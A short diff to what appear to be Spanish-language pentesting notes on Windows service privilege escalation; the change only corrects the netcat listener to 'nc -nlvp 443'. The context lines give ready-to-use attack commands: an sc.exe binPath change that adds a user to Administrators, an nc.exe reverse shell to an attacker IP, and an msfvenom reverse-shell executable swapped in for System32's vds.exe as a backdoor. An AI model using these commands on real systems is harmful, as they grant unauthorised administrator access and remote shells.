@@ -70,12 +70,12 @@ sc.exe config &lt;service_name&gt; binPath= &quot;cmd /c net localgroup Administ
 
 # Payload 2: Subir nc.exe y mandarnos rev_shell a un listener
 sc.exe config &lt;service_name&gt; binPath= &quot;C:\Users\&lt;user&gt;\nc.exe -e cmd &lt;kali_ip&gt; 443&quot;
-rlwrap nc 443
+rlwrap nc -nlvp 443
 
 # Payload 3: Sustituir binario de BinaryPath C:\Windows\System32\vds.exe -&gt; backdoor.exe
 # Kali
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; backdoor.exe
-rlwrap nc 443
+rlwrap nc -nlvp 443
 # PowerShell
 mv C:\Windows\System32\vds.exe C:\Windows\System32\vds.back
 mv backdoor.exe C:\Windows\System32\vds.exe</code></pre>
